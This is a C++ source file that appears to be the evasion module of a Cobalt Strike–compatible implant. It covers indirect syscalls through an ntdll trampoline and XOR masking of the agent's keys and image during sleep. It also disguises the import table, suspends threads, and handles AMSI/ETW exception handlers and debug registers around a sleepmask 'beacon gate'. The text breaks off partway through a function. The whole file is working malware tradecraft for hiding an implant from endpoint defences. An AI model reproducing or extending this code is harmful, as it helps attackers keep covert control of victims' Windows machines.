#include <common.h>
#include <module.h>

using namespace stardust;

namespace starburst {

static auto declfn init_syscall_table( instance& inst ) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.ntdll.handle );
    if ( !base ) return;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( base );
    auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( base + dos->e_lfanew );

    auto eat_rva  = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    auto eat_size = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    if ( !eat_rva ) return;

    auto eat       = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>( base + eat_rva );
    auto names     = reinterpret_cast<uint32_t*>( base + eat->AddressOfNames );
    auto ordinals  = reinterpret_cast<uint16_t*>( base + eat->AddressOfNameOrdinals );
    auto functions = reinterpret_cast<uint32_t*>( base + eat->AddressOfFunctions );

    for ( uint32_t i = 0; i < eat->NumberOfNames && inst.evasion.syscall_count < 64; i++ ) {
        auto name = reinterpret_cast<char*>( base + names[i] );

        if ( name[0] != 'N' || name[1] != 't' ) continue;
        if ( name[2] == 'D' && name[3] == 'l' && name[4] == 'l' ) continue;

        auto func_rva  = functions[ ordinals[i] ];

        // Skip forwarded exports (RVA falls within export directory range)
        if ( func_rva >= eat_rva && func_rva < eat_rva + eat_size ) continue;

        auto func_addr = base + func_rva;

        if ( func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 &&
             func_addr[3] == 0xB8 ) {
            uint16_t ssn = *reinterpret_cast<uint16_t*>( func_addr + 4 );
            auto& entry = inst.evasion.syscall_table[ inst.evasion.syscall_count ];
            entry.hash = hash_string( name );
            entry.ssn  = ssn;
            inst.evasion.syscall_count++;
        }
    }

    auto sections = IMAGE_FIRST_SECTION( nt );
    for ( uint16_t s = 0; s < nt->FileHeader.NumberOfSections; s++ ) {
        if ( !( sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;

        auto sec_base = base + sections[s].VirtualAddress;
        auto sec_size = sections[s].Misc.VirtualSize;

        for ( uint32_t j = 0; j + 2 < sec_size; j++ ) {
            if ( sec_base[j] == 0x0F && sec_base[j+1] == 0x05 && sec_base[j+2] == 0xC3 ) {
                for ( uint32_t k = 0; k < inst.evasion.syscall_count; k++ ) {
                    inst.evasion.syscall_table[k].trampoline = sec_base + j;
                }
                goto trampoline_found;
            }
        }
    }
trampoline_found:

    DBG_PRINT( inst, "syscall table: %d entries, trampoline=%p\n",
               inst.evasion.syscall_count,
               inst.evasion.syscall_count > 0 ? inst.evasion.syscall_table[0].trampoline : nullptr );
}

static auto declfn init_sleep_mask( instance& inst ) -> void {
    auto status = inst.bcrypt_mod.BCryptGenRandom(
        nullptr,
        inst.evasion.ekko.rc4_key,
        16,
        BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );

    if ( status == 0 ) {
        inst.evasion.ekko.img_base = inst.base.address;
        inst.evasion.ekko.img_size = static_cast<uint32_t>( inst.base.length );
        inst.evasion.ekko.initialized = true;
        DBG_PRINT( inst, "sleep mask init: base=%p size=%u\n",
                   (void*)inst.evasion.ekko.img_base, inst.evasion.ekko.img_size );
    }
}

static auto declfn xor_sensitive_data( instance& inst ) -> void {
    auto key = inst.evasion.ekko.rc4_key;
    for ( uint32_t i = 0; i < 32; i++ ) {
        inst.agent.aes_key[i] ^= key[ i % 16 ];
    }
    for ( uint32_t i = 0; i < 36; i++ ) {
        inst.agent.uuid[i] ^= key[ i % 16 ];
        inst.agent.payload_uuid[i] ^= key[ i % 16 ];
    }
}

static auto declfn iat_camouflage( instance& inst ) -> void {
    ULONG_PTR uAddress = reinterpret_cast<ULONG_PTR>(
        inst.ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 0x100 ) );
    if ( !uAddress ) return;

    if ( ( ( uAddress >> 8 ) & 0xFF ) > 0xFFFF ) {
        inst.advapi32.RegCloseKey( nullptr );
        inst.advapi32.RegOpenKeyExA( nullptr, nullptr, 0, 0, nullptr );
        inst.advapi32.RegQueryValueExA( nullptr, nullptr, nullptr, nullptr, nullptr, nullptr );
        inst.advapi32.RegEnumKeyExA( nullptr, 0, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr );
        inst.advapi32.RegSetValueExA( nullptr, nullptr, 0, 0, nullptr, 0 );
        inst.advapi32.RegCreateKeyExA( nullptr, nullptr, 0, nullptr, 0, 0, nullptr, nullptr, nullptr );
        inst.advapi32.OpenSCManagerW( nullptr, nullptr, 0 );
        inst.advapi32.OpenServiceW( nullptr, nullptr, 0 );
        inst.advapi32.QueryServiceConfigW( nullptr, nullptr, 0, nullptr );
        inst.advapi32.CloseServiceHandle( nullptr );
    }

    inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, reinterpret_cast<PVOID>( uAddress ) );
}

// ── Sleepmask-VS sleep ──

#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)

// CS beacon.h 4.12 compatible types

#define MASK_SIZE 13
#define DLL_BEACON_USER_DATA 0x0d
#define BEACON_USER_DATA_CUSTOM_SIZE 32

struct HEAP_RECORD { char* ptr; size_t size; };

enum ALLOCATED_MEMORY_PURPOSE {
    PURPOSE_EMPTY, PURPOSE_GENERIC_BUFFER, PURPOSE_BEACON_MEMORY,
    PURPOSE_SLEEPMASK_MEMORY, PURPOSE_BOF_MEMORY, PURPOSE_UDC2_MEMORY,
    PURPOSE_USER_DEFINED_MEMORY = 1000
};

enum ALLOCATED_MEMORY_LABEL {
    LABEL_EMPTY, LABEL_BUFFER, LABEL_PEHEADER, LABEL_TEXT,
    LABEL_RDATA, LABEL_DATA, LABEL_PDATA, LABEL_RELOC,
    LABEL_USER_DEFINED = 1000
};

enum ALLOCATED_MEMORY_ALLOCATION_METHOD {
    METHOD_UNKNOWN, METHOD_VIRTUALALLOC, METHOD_HEAPALLOC,
    METHOD_MODULESTOMP, METHOD_NTMAPVIEW, METHOD_USER_DEFINED = 1000
};

struct HEAPALLOC_INFO    { PVOID HeapHandle; BOOL DestroyHeap; };
struct MODULESTOMP_INFO  { HMODULE ModuleHandle; };

union ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION {
    HEAPALLOC_INFO   HeapAllocInfo;
    MODULESTOMP_INFO ModuleStompInfo;
    PVOID            Custom;
};

struct ALLOCATED_MEMORY_CLEANUP_INFORMATION {
    BOOL Cleanup;
    ALLOCATED_MEMORY_ALLOCATION_METHOD AllocationMethod;
    ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION AdditionalCleanupInformation;
};

struct ALLOCATED_MEMORY_SECTION {
    ALLOCATED_MEMORY_LABEL Label;
    PVOID  BaseAddress;
    SIZE_T VirtualSize;
    DWORD  CurrentProtect;
    DWORD  PreviousProtect;
    BOOL   MaskSection;
    DWORD  DripLoadPageSize;
};

struct ALLOCATED_MEMORY_REGION {
    ALLOCATED_MEMORY_PURPOSE Purpose;
    PVOID  AllocationBase;
    SIZE_T RegionSize;
    DWORD  Type;
    DWORD  DripLoadAllocationGranularity;
    ALLOCATED_MEMORY_SECTION Sections[8];
    ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation;
};

struct ALLOCATED_MEMORY {
    ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
};

struct BEACON_INFO {
    unsigned int   version;
    char*          sleep_mask_ptr;
    DWORD          sleep_mask_text_size;
    DWORD          sleep_mask_total_size;
    char*          beacon_ptr;
    HEAP_RECORD*   heap_records;
    char           mask[MASK_SIZE];
    ALLOCATED_MEMORY allocatedMemory;
};

struct SYSCALL_API_ENTRY { PVOID fnAddr; PVOID jmpAddr; DWORD sysnum; };
struct SYSCALL_API {
    SYSCALL_API_ENTRY ntAllocateVirtualMemory, ntProtectVirtualMemory,
        ntFreeVirtualMemory, ntGetContextThread, ntSetContextThread,
        ntResumeThread, ntCreateThreadEx, ntOpenProcess, ntOpenThread,
        ntClose, ntCreateSection, ntMapViewOfSection, ntUnmapViewOfSection,
        ntQueryVirtualMemory, ntDuplicateObject, ntReadVirtualMemory,
        ntWriteVirtualMemory, ntReadFile, ntWriteFile, ntCreateFile,
        ntQueueApcThread, ntCreateProcess, ntOpenProcessToken, ntTestAlert,
        ntSuspendProcess, ntResumeProcess, ntQuerySystemInformation,
        ntQueryDirectoryFile, ntSetInformationProcess, ntSetInformationThread,
        ntQueryInformationProcess, ntQueryInformationThread, ntOpenSection,
        ntAdjustPrivilegesToken, ntDeviceIoControlFile, ntWaitForMultipleObjects;
};
struct RTL_API {
    PVOID rtlDosPathNameToNtPathNameUWithStatusAddr;
    PVOID rtlFreeHeapAddr;
    PVOID rtlGetProcessHeapAddr;
};

struct USER_DATA {
    unsigned int      version;
    SYSCALL_API*      syscalls;
    char              custom[BEACON_USER_DATA_CUSTOM_SIZE];
    RTL_API*          rtls;
    ALLOCATED_MEMORY* allocatedMemory;
};

enum WinApi {
    INTERNETOPENA, INTERNETCONNECTA,
    VIRTUALALLOC, VIRTUALALLOCEX, VIRTUALPROTECT, VIRTUALPROTECTEX, VIRTUALFREE,
    GETTHREADCONTEXT, SETTHREADCONTEXT, RESUMETHREAD,
    CREATETHREAD, CREATEREMOTETHREAD,
    OPENPROCESS, OPENTHREAD, CLOSEHANDLE,
    CREATEFILEMAPPING, MAPVIEWOFFILE, UNMAPVIEWOFFILE,
    VIRTUALQUERY, DUPLICATEHANDLE,
    READPROCESSMEMORY, WRITEPROCESSMEMORY,
    EXITTHREAD, VIRTUALFREEEX, VIRTUALQUERYEX,
    WAITFORSINGLEOBJECT, SLEEP
};

struct FUNCTION_CALL {
    PVOID     functionPtr;
    WinApi    function;
    int       numOfArgs;
    ULONG_PTR args[10];
    BOOL      bMask;
    ULONG_PTR retValue;
};

typedef void (*SLEEPMASK_ENTRY)( BEACON_INFO*, FUNCTION_CALL* );

#ifndef TH32CS_SNAPTHREAD
#define TH32CS_SNAPTHREAD 0x00000004
#endif

struct sm_threadentry32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ThreadID;
    DWORD th32OwnerProcessID;
    LONG  tpBasePri;
    LONG  tpDeltaPri;
    DWORD dwFlags;
};

typedef HANDLE (WINAPI *fn_sm_CreateToolhelp32Snapshot)( DWORD, DWORD );
typedef BOOL   (WINAPI *fn_sm_Thread32First)( HANDLE, sm_threadentry32* );
typedef BOOL   (WINAPI *fn_sm_Thread32Next)( HANDLE, sm_threadentry32* );
typedef HANDLE (WINAPI *fn_sm_OpenThread)( DWORD, BOOL, DWORD );
typedef DWORD  (WINAPI *fn_sm_SuspendThread)( HANDLE );
typedef DWORD  (WINAPI *fn_sm_ResumeThread)( HANDLE );
typedef SIZE_T (WINAPI *fn_sm_VirtualQuery)( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );

static auto declfn sm_suspend_threads( instance& inst ) -> void {
    auto pSnap    = reinterpret_cast<fn_sm_CreateToolhelp32Snapshot>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst   = reinterpret_cast<fn_sm_Thread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext    = reinterpret_cast<fn_sm_Thread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen    = reinterpret_cast<fn_sm_OpenThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    auto pSuspend = reinterpret_cast<fn_sm_SuspendThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen || !pSuspend ) return;

    DWORD pid = inst.kernel32.GetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    sm_threadentry32 te = {};
    te.dwSize = sizeof( sm_threadentry32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID == pid && te.th32ThreadID != tid ) {
                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
                if ( ht ) {
                    pSuspend( ht );
                    inst.kernel32.CloseHandle( ht );
                }
            }
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

static auto declfn sm_resume_threads( instance& inst ) -> void {
    auto pSnap   = reinterpret_cast<fn_sm_CreateToolhelp32Snapshot>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst  = reinterpret_cast<fn_sm_Thread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext   = reinterpret_cast<fn_sm_Thread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen   = reinterpret_cast<fn_sm_OpenThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    auto pResume = reinterpret_cast<fn_sm_ResumeThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen || !pResume ) return;

    DWORD pid = inst.kernel32.GetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    sm_threadentry32 te = {};
    te.dwSize = sizeof( sm_threadentry32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID == pid && te.th32ThreadID != tid ) {
                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
                if ( ht ) {
                    pResume( ht );
                    inst.kernel32.CloseHandle( ht );
                }
            }
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

static auto declfn sm_query_protection( instance& inst, PVOID addr ) -> DWORD {
    auto pVQ = reinterpret_cast<fn_sm_VirtualQuery>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "VirtualQuery" ) ) );
    if ( !pVQ ) return PAGE_EXECUTE_READ;

    MEMORY_BASIC_INFORMATION mbi = {};
    if ( pVQ( addr, &mbi, sizeof( mbi ) ) == 0 ) return PAGE_EXECUTE_READ;
    return mbi.Protect;
}

static auto declfn init_sleepmask_vs_from_udrl( instance& inst ) -> bool {
    if ( !inst.evasion.udrl_user_data ) {
        DBG_PRINT( inst, "sleepmask-vs: no UDRL user data\n" );
        return false;
    }

    auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
    if ( !ud->allocatedMemory ) {
        DBG_PRINT( inst, "sleepmask-vs: no allocated memory\n" );
        return false;
    }

    for ( int i = 0; i < 6; i++ ) {
        auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[i];
        if ( reg.Purpose != PURPOSE_SLEEPMASK_MEMORY || !reg.AllocationBase )
            continue;

        void* entry = reg.Sections[1].BaseAddress;
        if ( !entry ) {
            DBG_PRINT( inst, "sleepmask-vs: no mask entry in Section[1]\n" );
            return false;
        }

        inst.evasion.sleepmask_vs.code_base = reg.AllocationBase;
        inst.evasion.sleepmask_vs.code_size = static_cast<uint32_t>( reg.RegionSize );
        inst.evasion.sleepmask_vs.entry     = entry;
        inst.evasion.sleepmask_vs.loaded    = true;
        inst.evasion.sleepmask_vs_text_size = static_cast<uint32_t>( reg.Sections[1].VirtualSize );

        DBG_PRINT( inst, "sleepmask-vs: from UDRL, entry=%p, base=%p, size=%u, text=%u\n",
            entry, reg.AllocationBase, inst.evasion.sleepmask_vs.code_size,
            inst.evasion.sleepmask_vs_text_size );
        return true;
    }

    DBG_PRINT( inst, "sleepmask-vs: no sleepmask memory region\n" );
    return false;
}

static auto declfn build_beacon_info(
    instance& inst, BEACON_INFO& info, HEAP_RECORD& sentinel
) -> void {
    memory::zero( &info, sizeof( BEACON_INFO ) );
    memory::zero( &sentinel, sizeof( HEAP_RECORD ) );

    info.version = 0x041200;
    info.sleep_mask_ptr = reinterpret_cast<char*>( inst.evasion.sleepmask_vs.code_base );
    info.sleep_mask_text_size = inst.evasion.sleepmask_vs_text_size;
    info.sleep_mask_total_size = inst.evasion.sleepmask_vs.code_size;

    uintptr_t beacon_base = 0;
    uint32_t  beacon_size = 0;
    USER_DATA* ud         = nullptr;

    if ( inst.evasion.udrl_user_data ) {
        ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
        if ( ud->allocatedMemory ) {
            for ( int ri = 0; ri < 6; ri++ ) {
                auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[ri];
                if ( reg.Purpose == PURPOSE_BEACON_MEMORY && reg.AllocationBase ) {
                    beacon_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
                    beacon_size = static_cast<uint32_t>( reg.RegionSize );
                    break;
                }
            }
        }
    }

    if ( !beacon_base || !beacon_size ) {
        if ( inst.evasion.ekko.initialized ) {
            beacon_base = inst.evasion.ekko.img_base;
            beacon_size = inst.evasion.ekko.img_size;
        } else {
            beacon_base = inst.base.address;
            beacon_size = inst.base.length;
        }
    }

    info.beacon_ptr = reinterpret_cast<char*>( beacon_base );

    if ( inst.evasion.ekko.initialized ) {
        for ( int i = 0; i < MASK_SIZE && i < 16; i++ )
            info.mask[i] = static_cast<char>( inst.evasion.ekko.rc4_key[i] );
    } else {
        ULONG seed = inst.kernel32.GetTickCount();
        for ( int i = 0; i < MASK_SIZE; i++ ) {
            seed = inst.ntdll.RtlRandomEx( &seed );
            info.mask[i] = static_cast<char>( seed & 0xFF );
        }
    }

    if ( inst.heap_tracker.count > 0 ) {
        uint32_t n = inst.heap_tracker.count;
        HEAP_RECORD* records = reinterpret_cast<HEAP_RECORD*>(
            inst.ntdll.RtlAllocateHeap(
                NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY,
                ( n + 1 ) * sizeof( HEAP_RECORD )
            )
        );
        if ( records ) {
            for ( uint32_t i = 0; i < n; i++ ) {
                records[i].ptr  = reinterpret_cast<char*>( inst.heap_tracker.entries[i].ptr );
                records[i].size = inst.heap_tracker.entries[i].size;
            }
            records[n].ptr  = nullptr;
            records[n].size = 0;
            info.heap_records = records;
        } else {
            sentinel.ptr = nullptr;
            sentinel.size = 0;
            info.heap_records = &sentinel;
        }
    } else {
        sentinel.ptr = nullptr;
        sentinel.size = 0;
        info.heap_records = &sentinel;
    }

    if ( ud && ud->allocatedMemory ) {
        info.allocatedMemory = *ud->allocatedMemory;
    } else {
        auto& region = info.allocatedMemory.AllocatedMemoryRegions[0];
        region.Purpose = PURPOSE_BEACON_MEMORY;
        region.AllocationBase = reinterpret_cast<PVOID>( beacon_base );
        region.RegionSize = beacon_size;
        region.Type = MEM_PRIVATE;

        if ( region.AllocationBase && region.RegionSize > 0 ) {
            auto& sec = region.Sections[0];
            sec.Label = LABEL_TEXT;
            sec.BaseAddress = region.AllocationBase;
            sec.VirtualSize = region.RegionSize;
            DWORD prot = sm_query_protection( inst, region.AllocationBase );
            sec.CurrentProtect  = prot;
            sec.PreviousProtect = prot;
            sec.MaskSection = TRUE;
        }
    }
}

#endif /* MASK_SLEEPMASK_VS && _WIN64 */

auto declfn evasion_on_init( instance& inst ) -> void {
    init_syscall_table( inst );
    init_sleep_mask( inst );
    iat_camouflage( inst );

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    spoof_init( inst );
#endif

#ifdef INCLUDE_EVASION_ETW
    evasion_patch_etw( inst );
#endif

#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    init_sleepmask_vs_from_udrl( inst );
#endif
}

auto declfn evasion_on_cleanup( instance& inst ) -> void {
#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    spoof_cleanup( inst );
#endif

    for ( uint32_t i = 0; i < 16; i++ ) {
        inst.evasion.ekko.rc4_key[i] = 0;
    }
    inst.evasion.ekko.initialized = false;

#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    if ( inst.evasion.sleepmask_vs.loaded ) {
        inst.evasion.sleepmask_vs = {};
    }
#endif
}

#include <evasion/sleep_masks.h>

auto declfn evasion_pre_sleep( instance& inst ) -> void {
    mask_pre_sleep( inst );
}

auto declfn evasion_post_sleep( instance& inst ) -> void {
    mask_post_sleep( inst );
}

auto declfn evasion_full_image_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_FULL_IMAGE
    fi_sleep( inst, sleep_ms );
#else
    (void)inst; (void)sleep_ms;
#endif
}

auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
    if ( inst.evasion.ekko.initialized ) {
        ekko_sleep( inst, sleep_ms );
        return;
    }
#endif
    /* Fallback: standard pre-sleep → delay → post-sleep cycle */
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
}

auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_UDRL
    /*
     * UDRL sleep mask. When the UDRL loader provided user data, update
     * the ekko fields from it (the reflectively loaded image may live at
     * a different base than what RipStart() computed). Then dispatch to
     * Ekko (x64) or full-image XOR fallback.
     */
    if ( inst.evasion.udrl_user_data ) {
        auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
        if ( ud->allocatedMemory && inst.evasion.ekko.initialized ) {
            auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[0];
            if ( reg.AllocationBase && reg.RegionSize ) {
                inst.evasion.ekko.img_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
                inst.evasion.ekko.img_size = static_cast<uint32_t>( reg.RegionSize );
            }
        }
    }

#ifdef _WIN64
    if ( inst.evasion.ekko.initialized ) {
        ekko_sleep( inst, sleep_ms );
        return;
    }
#endif

    /* x86 or ekko not initialized: full-image XOR fallback */
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
#else
    (void)inst; (void)sleep_ms;
#endif
}

// VEH suspend/restore for sleepmask XOR safety.
// The AMSI/ETW VEH handler lives inside the beacon image. When the sleepmask
// COFF XORs the image, the handler becomes garbage - any exception during
// sleep (e.g. a DR hardware breakpoint) causes infinite VEH recursion and an
// ILLEGAL_INSTRUCTION crash. We clear hardware breakpoints and deregister the
// VEH before the XOR, then restore both after the image is un-XORed.
#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64) && \
    defined(INCLUDE_EVASION_AMSI)

struct sm_veh_state { PVOID handle; DWORD64 dr0, dr1, dr7; };

static auto declfn sm_suspend_veh( instance& inst, sm_veh_state& s ) -> void {
    s = {};
    if ( !inst.evasion.amsi_veh ) return;
    s.handle = inst.evasion.amsi_veh;

    auto pNtGetCtx = reinterpret_cast<decltype(NtGetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtGetContextThread" ) ) );
    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtSetContextThread" ) ) );

    if ( pNtGetCtx && pNtSetCtx ) {
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        pNtGetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
        s.dr0 = ctx.Dr0; s.dr1 = ctx.Dr1; s.dr7 = ctx.Dr7;
        ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr7 = 0;
        pNtSetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
    }

    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );
    if ( pRemoveVEH ) pRemoveVEH( s.handle );
    inst.evasion.amsi_veh = nullptr;
}

static auto declfn sm_restore_veh( instance& inst, const sm_veh_state& s ) -> void {
    if ( !s.handle || !inst.evasion.amsi_veh_fn ) return;

    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
    if ( pAddVEH )
        inst.evasion.amsi_veh = pAddVEH( 1,
            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( inst.evasion.amsi_veh_fn ) );

    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtSetContextThread" ) ) );
    if ( pNtSetCtx ) {
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        ctx.Dr0 = s.dr0; ctx.Dr1 = s.dr1; ctx.Dr7 = s.dr7;
        pNtSetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
    }
}

#endif

auto declfn evasion_beacon_gate_call(
    instance& inst, void* fn_ptr, int win_api_id,
    int num_args, ULONG_PTR* args, bool mask
) -> ULONG_PTR {
#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    if ( inst.evasion.sleepmask_vs.loaded && inst.evasion.sleepmask_vs.entry ) {
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_veh_state veh_state = {};
#endif
        DWORD pre_prot = 0;
        if ( mask ) {
            inst.kernel32.VirtualProtect(
                reinterpret_cast<PVOID>( inst.base.address ),
                inst.base.length,
                PAGE_EXECUTE_READWRITE, &pre_prot );
        }

        BEACON_INFO info;
        HEAP_RECORD sentinel;
        build_beacon_info( inst, info, sentinel );

        FUNCTION_CALL call = {};
        call.functionPtr = fn_ptr;
        call.function    = static_cast<WinApi>( win_api_id );
        call.numOfArgs   = num_args;
        for ( int i = 0; i < num_args && i < 10; i++ )
            call.args[i] = args[i];
        call.bMask   = mask ? TRUE : FALSE;
        call.retValue = 0;

        DWORD coff_prot = 0;
        if ( mask ) {
            inst.kernel32.VirtualProtect(
                inst.evasion.sleepmask_vs.code_base,
                inst.evasion.sleepmask_vs.code_size,
                PAGE_EXECUTE_READWRITE, &coff_prot );
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
            sm_suspend_veh( inst, veh_state );
#endif
            sm_suspend_threads( inst );
        }

        void* old_aup_gate;
        __asm__ volatile (
            ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
            : "=a"(old_aup_gate)
        );
        {
            register void* val __asm__("rcx") = reinterpret_cast<void*>( &inst );
            __asm__ volatile (
                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
                :: "c"(val) : "memory"
            );
        }

        auto fn = reinterpret_cast<SLEEPMASK_ENTRY>( inst.evasion.sleepmask_vs.entry );
        fn( &info, &call );

        {
            register void* val __asm__("rcx") = old_aup_gate;
            __asm__ volatile (
                ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
                :: "c"(val) : "memory"
            );
        }

        if ( mask ) {
            DWORD coff_restore = 0;
            inst.kernel32.VirtualProtect(
                inst.evasion.sleepmask_vs.code_base,
                inst.evasion.sleepmask_vs.code_size,
                PAGE_EXECUTE_READ, &coff_restore );
            DWORD post_prot = 0;
            inst.kernel32.VirtualProtect(
                reinterpret_cast<PVOID>( inst.base.address ),
                inst.base.length,
                PAGE_EXECUTE_READ, &post_prot );
            sm_resume_threads( inst );
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
            sm_restore_veh( inst, veh_state );
#endif
        }

        if ( info.heap_records && info.heap_records != &sentinel )
            inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, info.heap_records );

        return call.retValue;
    }
#endif
    (void)win_api_id; (void)mask;
    typedef ULONG_PTR (__stdcall *gate_0)();
    typedef ULONG_PTR (__stdcall *gate_1)( ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_2)( ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_3)( ULONG_PTR, ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_4)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_5)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_6)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );

    switch ( num_args ) {
        case 0: return reinterpret_cast<gate_0>( fn_ptr )();
        case 1: return reinterpret_cast<gate_1>( fn_ptr )( args[0] );
        case 2: return reinterpret_cast<gate_2>( fn_ptr )( args[0], args[1] );
        case 3: return reinterpret_cast<gate_3>( fn_ptr )( args[0], args[1], args[2] );
        case 4: return reinterpret_cast<gate_4>( fn_ptr )( args[0], args[1], args[2], args[3] );
